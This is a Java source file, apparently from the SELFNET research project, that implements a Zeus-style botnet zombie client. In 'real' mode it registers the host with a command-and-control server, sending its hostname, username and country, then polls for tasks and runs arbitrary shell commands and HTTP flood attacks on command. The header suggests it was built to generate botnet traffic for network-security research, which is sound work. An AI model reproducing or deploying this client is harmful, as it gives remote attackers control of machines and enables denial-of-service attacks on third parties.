/**
	ZombieBot: Real or cloned zombie to recruit into a C&C Server making up a given botnet.
	Copyright (C) 2018 SELFNET H2020 Project <http://selfnet-5g.eu>

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

package selfnet.botnet;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.math.BigInteger;
import java.net.ConnectException;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.regex.Pattern;

import org.apache.commons.httpclient.params.HttpConnectionParams;
import org.apache.commons.httpclient.protocol.Protocol;
import org.apache.commons.httpclient.protocol.ProtocolSocketFactory;

import selfnet.Botnet;
import selfnet.attack.Execute;
import selfnet.attack.HTTPFlood;

public class ZeusBotnet extends Botnet {
	protected String uid;

	private static String ADD_USER_URL = "botload/addbot.php?";
	private static String TASK_URL = "botload/tasks.php?";

	public ZeusBotnet(InetAddress ccIP) {
		super(ccIP);
	}

	public void updateUID(String uid) {
		this.uid = uid;
	}

	@Override
	public void registerZombie() {
		if (uid == null) {
			MessageDigest digest = null;

			try {
				// Extract the UID from the current MAC address
				Enumeration<NetworkInterface> ifaces = NetworkInterface.getNetworkInterfaces();

				while (ifaces.hasMoreElements()) {
					NetworkInterface iface = ifaces.nextElement();
					Enumeration<InetAddress> addresses = iface.getInetAddresses();

					while (addresses.hasMoreElements()) {
						InetAddress ip = addresses.nextElement();

						if (ip instanceof Inet4Address && ip.getHostAddress().compareTo("127.0.0.1") != 0) {
							NetworkInterface network = NetworkInterface.getByInetAddress(ip);

							byte[] mac = network.getHardwareAddress();
							digest = MessageDigest.getInstance("SHA-1");
							digest.update(mac);
						}
					}
				}
			} catch (Exception excp) {
				excp.printStackTrace();
			}

			// Get the SHA-1 digest
			byte[] hash = digest.digest();

			// Transform the digest to a given format
			BigInteger hexadecimal = new BigInteger(1, hash);
			String hashText = hexadecimal.toString(16);
			while (hashText.length() < 32)
				hashText = "0" + hashText;

			String uid = hashText.substring(0, 8) + "-" + hashText.substring(8, 12);
			uid += "-" + hashText.substring(12, 16) + "-" + hashText.substring(16, 20);
			uid += "-" + hashText.substring(20, 32) + "-" + hashText.substring(32);

			updateUID(uid);
		}

		try {
			if (getVerbose())
				System.out.print("Host recruited as a zombie? ");

			// Add params to include in the request
			String hostname = InetAddress.getLocalHost().getHostName() + " [" + System.getProperty("user.name") + "]";

			Params params = new Params();
			params.addParam("uid", "{" + uid + "}");
			params.addParam("hostname", hostname.replaceAll(" ", "%20"));
			params.addParam("cc", System.getProperty("user.country"));

			// Recruit the current host as a zombie
			sendRequest(ADD_USER_URL + params);

			if (getVerbose())
				System.out.println("YES");
		} catch (Exception excp) {
			if (getVerbose())
				System.out.print("NO");

			excp.printStackTrace();
		}
	}

	@Override
	public void requestCommand() {
		try {
			if (getVerbose())
				System.out.print("Sending command request - Anything to run? ");

			// Add params to include in the request
			Params params = new Params();
			params.addParam("uid", "{" + uid + "}");

			// Send the command request
			String response = sendRequest(TASK_URL + params);

			// Print result and execute command, if required
			if (getVerbose())
				System.out.println(response.equals("") ? "NONE" : response);

			// Execute the command depending on the bot type (real or fake)
			if (!response.equalsIgnoreCase("CONNECTION TIMED OUT") && !response.equalsIgnoreCase("CONNECTION ERROR"))
				if (getBotType().equals(Botnet.BotType.real))
					executeCommand(response);
				else if (getVerbose() && !response.equals(""))
					System.out.println("NOTE: Commands will not be executed (fake bot)");
		} catch (Exception excp) {
			excp.printStackTrace();
		}
	}

	private String sendRequest(String path) throws Exception {
		HttpConnectionParams params = new HttpConnectionParams();
		params.setConnectionTimeout(10000);

		// Send the request to the C&C server
		StringBuffer response = new StringBuffer();

		try {
			ProtocolSocketFactory factory = Protocol.getProtocol("http").getSocketFactory();
			Socket socket = factory.createSocket(getBotnetIP().getHostName(), getBotnetPort(), getBotIP(), getBotPort(), params);

			Writer out = new OutputStreamWriter(socket.getOutputStream(), "ISO-8859-1");
			out.write("GET /" + path + " HTTP/1.1\r\n");
			out.write("Host: " + getBotnetIP().getHostName() + ":" + getBotnetPort() + "\r\n");
			out.write("\r\n");
			out.flush();

			// Read the HTTP response sent by the C&C server
			BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream(), "ISO-8859-1"));

			String line = null;
			while ((line = reader.readLine()) != null)
				if (!isHttpHeader(line))
					response.append(line);

			socket.close();
		} catch (ConnectException cexcp) {
			return "CONNECTION TIMED OUT";
		} catch (Exception excp) {
			return "CONNECTION ERROR";
		}

		return response.toString();
	}

	private boolean isHttpHeader(String line) {
		if (line.startsWith("HTTP/1.1") || line.startsWith("Date:") || line.startsWith("Server:") || line.startsWith("Content-Length") || line.startsWith("Content-Type"))
			return true;

		return false;
	}

	private void executeCommand(String commands) {
		// Execute each command in parallel
		for (String command : Arrays.asList(commands.split(Pattern.quote("|"))))
			switch (command.split("::")[0]) {
			case "exec":
				// Execute the command
				new Execute(command.split("::")[1], getVerbose());

				break;

			case "httpflood":
				String[] execute = command.split("::")[1].split(",");

				// Execute the HTTP flood command
				new HTTPFlood(execute[0], Integer.parseInt(execute[1]), getVerbose());

				break;
			}
	}
}
